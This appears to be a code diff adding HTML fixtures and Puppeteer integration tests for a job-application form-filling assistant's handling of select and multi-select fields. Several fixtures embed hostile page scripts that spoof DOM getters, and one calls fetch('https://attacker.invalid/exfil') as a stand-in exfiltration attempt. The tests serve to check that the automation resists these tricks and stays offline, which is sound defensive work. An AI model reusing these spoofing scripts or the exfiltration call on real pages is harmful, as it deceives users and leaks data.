@@ -115,6 +115,208 @@ finalInput.addEventListener("click",()=>{document.body.dataset.clicked="yes"});
 </script>
 </body></html>"""
 
+SINGLE_SELECT_EMPTY_PLACEHOLDER_FIXTURE = b"""<!doctype html>
+<html><head><title>Single Select Empty Placeholder Fixture</title></head>
+<body><form>
+<label>Country <select name="country" required>
+<option value="" disabled selected>Choose a country</option>
+<option value="us">United States</option>
+<option value="ca">Canada</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+<option value="js">JavaScript</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_DISABLED_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Disabled Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust" disabled>Rust</option>
+<optgroup label="legacy" disabled><option value="cobol">Cobol</option></optgroup>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_DUPLICATE_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Duplicate Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="go">Go duplicate</option>
+<option value="rust">Rust</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_MASKED_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Masked Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+const realOptions = s.options;
+Object.defineProperty(s, 'multiple', { configurable: true, get() { return false; } });
+Object.defineProperty(s, 'options', { configurable: true, get() { return [realOptions[2], realOptions[0], realOptions[1]]; } });
+Object.defineProperty(s, 'value', { configurable: true, get() { return ['masked']; } });
+const opts = realOptions;
+Object.defineProperty(opts[0], 'value', { configurable: true, get() { return 'masked'; } });
+Object.defineProperty(opts[0], 'selected', { configurable: true, get() { return true; } });
+</script></body></html>"""
+
+MULTI_SELECT_OPTION_LABEL_SPOOF_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Option Label Spoof Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+const option = s.options[0];
+Object.defineProperty(option, 'label', { configurable: true, get() { return 'Rust'; } });
+Object.defineProperty(option, 'text', { configurable: true, get() { return 'Python'; } });
+</script></body></html>"""
+
+MULTI_SELECT_HOSTILE_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Hostile Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+function exfil() { s.options[0].label = 'Drifted'; fetch('https://attacker.invalid/exfil').catch(()=>{}); }
+s.addEventListener('input', exfil);
+s.addEventListener('change', exfil);
+</script></body></html>"""
+
+MULTI_SELECT_POST_EVENT_DRIFT_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Post Event Drift Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+s.addEventListener('change', () => {
+  const duplicate = document.createElement('option');
+  duplicate.value = 'go';
+  duplicate.textContent = 'Go duplicate';
+  s.append(duplicate);
+});
+</script></body></html>"""
+MULTI_SELECT_DISABLED_DUPLICATE_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Disabled Duplicate Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go" disabled>Go disabled</option>
+<option value="go">Go enabled</option>
+<option value="rust">Rust</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_MULTIPLE_SPOOF_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Multiple Spoof Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+Object.defineProperty(s, 'multiple', { configurable: true, get() { return false; } });
+</script></body></html>"""
+
+MULTI_SELECT_OPTIONS_SPOOF_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Options Spoof Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+const real = s.options;
+const fake = [real[2], real[0], real[1]];
+Object.defineProperty(s, 'options', { configurable: true, get() { return fake; } });
+</script></body></html>"""
+
+MULTI_SELECT_PRESELECTED_DISABLED_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Preselected Disabled Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="cobol" disabled selected>Cobol disabled</option>
+<option value="go">Go enabled</option>
+<option value="rust">Rust</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
+MULTI_SELECT_DISABLED_OPTGROUP_SPOOF_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select Disabled Optgroup Spoof Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<optgroup label="legacy" disabled><option value="cobol">Cobol</option></optgroup>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+const s = document.querySelector('select');
+const group = s.querySelector('optgroup');
+const option = group.querySelector('option');
+Object.defineProperty(option, 'parentElement', { configurable: true, get() { return s; } });
+Object.defineProperty(group, 'localName', { configurable: true, get() { return 'select'; } });
+Object.defineProperty(group, 'tagName', { configurable: true, get() { return 'SELECT'; } });
+</script></body></html>"""
+
+MULTI_SELECT_TOCTOU_TIMER_FIXTURE = b"""<!doctype html>
+<html><head><title>Multi Select TOCTOU Timer Fixture</title></head>
+<body><form>
+<label>Skills <select name="skills" multiple required>
+<option value="go">Go</option>
+<option value="rust">Rust</option>
+<option value="python">Python</option>
+</select></label>
+<button type="submit" id="submit-final">Submit Application</button>
+</form></body></html>"""
+
 class FixtureHandler(http.server.SimpleHTTPRequestHandler):
     attacker_http_requests = 0
     final_like_requests = 0
@@ -205,9 +407,23 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
             else CROSS_JOB_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-job")
             else FINAL_LIKE_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-final")
             else SUBMIT_CONTINUATION_FIXTURE if self.path.startswith("/continue-native")
-            else INPUT_BUTTON_NETWORK_FIXTURE if self.path.startswith("/input-button-network")
             else INPUT_BUTTON_FINAL_LIKE_FIXTURE if self.path.startswith("/input-button-final")
+            else INPUT_BUTTON_NETWORK_FIXTURE if self.path.startswith("/input-button-network")
             else INPUT_BUTTON_FIXTURE if self.path.startswith("/input-button")
+            else SINGLE_SELECT_EMPTY_PLACEHOLDER_FIXTURE if self.path.startswith("/single-select-empty-placeholder")
+            else MULTI_SELECT_PRESELECTED_DISABLED_FIXTURE if self.path.startswith("/multi-select-preselected-disabled")
+            else MULTI_SELECT_DISABLED_OPTGROUP_SPOOF_FIXTURE if self.path.startswith("/multi-select-disabled-optgroup-spoof")
+            else MULTI_SELECT_TOCTOU_TIMER_FIXTURE if self.path.startswith("/multi-select-toctou-timer")
+            else MULTI_SELECT_OPTIONS_SPOOF_FIXTURE if self.path.startswith("/multi-select-options-spoof")
+            else MULTI_SELECT_OPTION_LABEL_SPOOF_FIXTURE if self.path.startswith("/multi-select-option-label-spoof")
+            else MULTI_SELECT_MULTIPLE_SPOOF_FIXTURE if self.path.startswith("/multi-select-multiple-spoof")
+            else MULTI_SELECT_POST_EVENT_DRIFT_FIXTURE if self.path.startswith("/multi-select-post-event-drift")
+            else MULTI_SELECT_HOSTILE_FIXTURE if self.path.startswith("/multi-select-hostile")
+            else MULTI_SELECT_DISABLED_DUPLICATE_FIXTURE if self.path.startswith("/multi-select-disabled-duplicate")
+            else MULTI_SELECT_DUPLICATE_FIXTURE if self.path.startswith("/multi-select-duplicate")
+            else MULTI_SELECT_MASKED_FIXTURE if self.path.startswith("/multi-select-masked")
+            else MULTI_SELECT_DISABLED_FIXTURE if self.path.startswith("/multi-select-disabled")
+            else MULTI_SELECT_FIXTURE if self.path.startswith("/multi-select")
             else CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes()
         )
         self.wfile.write(body)
@@ -250,6 +466,15 @@ def _validated_emergency_cleanup(identities: dict, manifest: Path) -> bool:
         except ProcessLookupError:
             return False
 
+    def groups_absent(groups: set[int], *, timeout: float = 5.0) -> bool:
+        deadline = time.monotonic() + timeout
+        while time.monotonic() < deadline:
+            if all(not group_exists(pgid) for pgid in groups):
+                return True
+            time.sleep(0.05)
+        return all(not group_exists(pgid) for pgid in groups)
+
+
     try:
         current = json.loads(manifest.read_text(encoding="utf-8"))
         owner = identities["owner"]
@@ -274,7 +499,7 @@ def _validated_emergency_cleanup(identities: dict, manifest: Path) -> bool:
             return False
         groups = {browser["pgid"], owner["pgid"]}
         if current.get("state") == "closed":
-            return current.get("cleanup") is True and all(not group_exists(pgid) for pgid in groups)
+            return current.get("cleanup") is True and groups_absent(groups)
         if current.get("state") != "open_guarded":
             return False
         identity_matches = {
@@ -302,12 +527,7 @@ def _validated_emergency_cleanup(identities: dict, manifest: Path) -> bool:
                     os.killpg(pgid, signal.SIGKILL)
                 except ProcessLookupError:
                     pass
-        deadline = time.monotonic() + 5
-        while time.monotonic() < deadline:
-            if all(not group_exists(pgid) for pgid in groups):
-                return not unverified_group_present
-            time.sleep(0.05)
-        return False
+        return groups_absent(groups) and not unverified_group_present
     except (KeyError, TypeError, ValueError, OSError, AttributeError, json.JSONDecodeError):
         return False
 
@@ -893,6 +1113,420 @@ def test_input_type_button_hostile_listener_remains_terminal_and_offline(fixture
 
 
 @BROWSER_INTEGRATION_SKIP
+def test_single_select_empty_placeholder_can_select_enabled_value(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/single-select-empty-placeholder")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-single-select-empty-placeholder",
+        run_id=33,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "country")
+        assert field["multiple"] is False
+        assert field["value"] == ""
+        assert field["valid"] is False
+        assert field["validity_flags"] == ["valueMissing"]
+        session.select(field["target_id"], "us")
+        after = session.observe()
+        selected = field_by_name(after, "country")
+        assert selected["value"] == "us"
+        assert selected["valid"] is True
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_two_value_selection_and_observation(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select",
+        run_id=20,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["kind"] == "select"
+        assert field["multiple"] is True
+        assert field["value"] == []
+        assert "options_ambiguous" not in field["validity_flags"]
+        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python", "js"]
+        assert all(opt["enabled"] for opt in field["options"])
+        session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["go", "rust"]
+        assert field2["valid"] is True
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_rejects_out_of_order_values(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-out-of-order",
+        run_id=26,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("rust", "go"))
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_rejects_disabled_option_and_disabled_optgroup(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-disabled")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-disabled",
+        run_id=21,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["multiple"] is True
+        options = {opt["value"]: opt for opt in field["options"]}
+        assert options["go"]["enabled"] is True
+        assert options["rust"]["enabled"] is False
+        assert options["cobol"]["enabled"] is False
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("rust", "cobol", "go"))
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        session.select(field["target_id"], ("go",))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["go"]
+        assert field2["valid"] is True
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_disabled_optgroup_native_ancestry_wins_zero_change(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-disabled-optgroup-spoof")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-disabled-optgroup-spoof",
+        run_id=31,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        options = {opt["value"]: opt for opt in field["options"]}
+        assert options["go"]["enabled"] is True
+        assert options["cobol"]["enabled"] is False
+        assert field["value"] == []
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("cobol",))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == []
+        assert field2["options"][1]["enabled"] is False
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_duplicate_values_denied(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-duplicate")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-duplicate",
+        run_id=22,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert "options_ambiguous" in field["validity_flags"]
+        assert field["valid"] is False
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("go",))
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_disabled_duplicate_value_only_enabled_index_selected(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-disabled-duplicate")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-disabled-duplicate",
+        run_id=25,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert "options_ambiguous" in field["validity_flags"]
+        assert field["valid"] is False
+        assert field["options"][0]["enabled"] is False
+        assert field["options"][1]["enabled"] is True
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("go",))
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_own_getter_masking_defeated(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-masked")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-masked",
+        run_id=23,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["multiple"] is True
+        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python"]
+        assert field["value"] == []
+        assert field["options"][0]["value"] == "go"
+        session.select(field["target_id"], ("rust", "python"))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["rust", "python"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_option_label_getters_spoof_defeated(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-option-label-spoof")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-option-label-spoof",
+        run_id=30,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["multiple"] is True
+        assert all(set(option) == {"value", "label", "enabled"} for option in field["options"])
+        assert [(opt["value"], opt["label"]) for opt in field["options"]] == [
+            ("go", "Go"),
+            ("rust", "Rust"),
+            ("python", "Python"),
+        ]
+        session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["go", "rust"]
+        assert [(opt["value"], opt["label"]) for opt in field2["options"]] == [
+            ("go", "Go"),
+            ("rust", "Rust"),
+            ("python", "Python"),
+        ]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_timer_drift_rejected_before_mutation(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-toctou-timer")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-toctou-timer",
+        run_id=32,
+        job_id=123,
+        internal_transport_url=transport_url,
+        test_drift=True,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["value"] == []
+        assert all(set(option) == {"value", "label", "enabled"} for option in field["options"])
+        session._trigger_select_drift_for_test()
+        with pytest.raises(BrowserAdapterError, match="stale_generation"):
+            session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        assert field_by_name(after, "skills")["value"] == ["rust"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_select_drift_rejected_without_internal_transport():
+    with pytest.raises(BrowserAdapterError, match="test_select_drift_unavailable"):
+        PuppeteerSession.start(
+            headless=True,
+            session_id="session-drift-no-transport",
+            run_id=33,
+            job_id=123,
+            test_drift=True,
+        )
+
+
+@BROWSER_INTEGRATION_SKIP
+@pytest.mark.parametrize("bad", [0, None, "", 1, "yes"])
+def test_select_drift_rejected_for_non_bool(bad):
+    with pytest.raises(BrowserAdapterError, match="test_select_drift_unavailable"):
+        PuppeteerSession.start(
+            headless=True,
+            session_id="session-drift-non-bool",
+            run_id=33,
+            job_id=123,
+            internal_transport_url="http://127.0.0.1:1/clean",
+            test_drift=bad,
+        )
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_post_event_descriptor_drift_is_not_retained(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-post-event-drift")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-post-event-drift",
+        run_id=34,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        with pytest.raises(BrowserAdapterError, match="field_value_not_retained"):
+            session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        drifted = field_by_name(after, "skills")
+        assert drifted["valid"] is False
+        assert "options_ambiguous" in drifted["validity_flags"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_multiple_spoof_defeated(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-multiple-spoof")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-multiple-spoof",
+        run_id=27,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["multiple"] is True
+        session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["go", "rust"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_options_spoof_defeated(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-options-spoof")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-options-spoof",
+        run_id=28,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python"]
+        session.select(field["target_id"], ("go", "rust"))
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["go", "rust"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_preselected_disabled_rejected_and_zero_change(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-preselected-disabled")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-preselected-disabled",
+        run_id=29,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        assert field["value"] == ["cobol"]
+        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
+            session.select(field["target_id"], ("go", "rust"))
+        assert field["valid"] is False
+        assert field["validity_flags"].count("invalid_selected_option") == 1
+        after = session.observe()
+        field2 = field_by_name(after, "skills")
+        assert field2["value"] == ["cobol"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_multi_select_hostile_input_change_listener_remains_terminal_and_offline(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/multi-select-hostile")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-multi-select-hostile",
+        run_id=24,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        field = field_by_name(observation, "skills")
+        before = session.network_counters()
+        with pytest.raises(BrowserAdapterError, match="unsafe_network_attempt"):
+            session.select(field["target_id"], ("go", "rust"))
+        counters = session.network_counters()
+        assert counters["terminal_reason"] == "unsafe_network_attempt"
+        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"]
+        assert counters["dnsLookups"] == before["dnsLookups"]
+        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
 def test_lever_session_uses_selected_policy_and_keeps_final_submit_manual(fixture_server):
     with PuppeteerSession.start(
         headless=True,
@@ -1440,6 +2074,27 @@ def test_preflight_protocol_accepts_canonical_response_length() -> None:
 
 
 @BROWSER_INTEGRATION_SKIP
+def test_select_native_self_test_uses_isolated_realm_spoofs():
+    env = os.environ.copy()
+    executable = env.get("PUPPETEER_EXECUTABLE_PATH")
+    if executable:
+        env["JOBS_ASSISTANT_CHROMIUM_EXECUTABLE"] = executable
+    result = subprocess.run(
+        ["node", str(Path("src/jobs_assistant/puppeteer_runner.js")), "--select-native-self-test"],
+        cwd=str(Path.cwd()),
+        env=env,
+        text=True,
+        capture_output=True,
+        timeout=30,
+        check=False,
+    )
+    assert result.returncode == 0, result.stderr + result.stdout
+    frames = _decode_frames(result.stdout.encode())
+    assert frames[-1]["ok"] is True
+    assert frames[-1]["data"]["passed"] == 1
+
+
+@BROWSER_INTEGRATION_SKIP
 def test_npm_puppeteer_smoke_runs_real_headless_chromium():
     result = subprocess.run(
         ["npm", "run", "puppeteer-smoke", "--silent"],
@@ -1572,4 +2227,4 @@ def test_runner_request_guard_self_test() -> None:
         check=False,
     )
     assert result.returncode == 0, result.stderr.decode()
-    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 7}}]
+    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 9}}]
